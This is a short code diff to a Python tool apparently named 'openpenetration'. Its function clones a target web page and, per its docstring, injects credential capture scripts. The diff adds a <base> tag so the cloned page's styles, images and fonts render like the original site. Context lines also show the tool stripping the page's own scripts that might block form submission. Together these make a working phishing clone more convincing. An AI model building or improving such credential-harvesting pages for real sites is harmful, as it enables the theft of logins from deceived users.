@@ -23,8 +23,8 @@ init(autoreset=True)
 
 # Global state
 target_folder = None
-config = None
-logger = None
+config = {}
+logger = logging.getLogger("openpenetration")
 httpd = None
 
 
@@ -186,6 +186,20 @@ def fetch_html(url):
 def save_cloned_html(url, html_content, folder):
     """Clone the target HTML and inject credential capture scripts."""
     soup = BeautifulSoup(html_content, "html.parser")
+
+    # Inject <base> tag so relative CSS/image/font URLs render properly
+    parsed_url = urlparse(url)
+    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
+    
+    if not soup.head:
+        head_tag = soup.new_tag("head")
+        if soup.html:
+            soup.html.insert(0, head_tag)
+        else:
+            soup.insert(0, head_tag)
+            
+    base_tag = soup.new_tag("base", href=base_url)
+    soup.head.insert(0, base_tag)
 
     # Remove original JS that might block form submission
     for script in soup.find_all("script"):
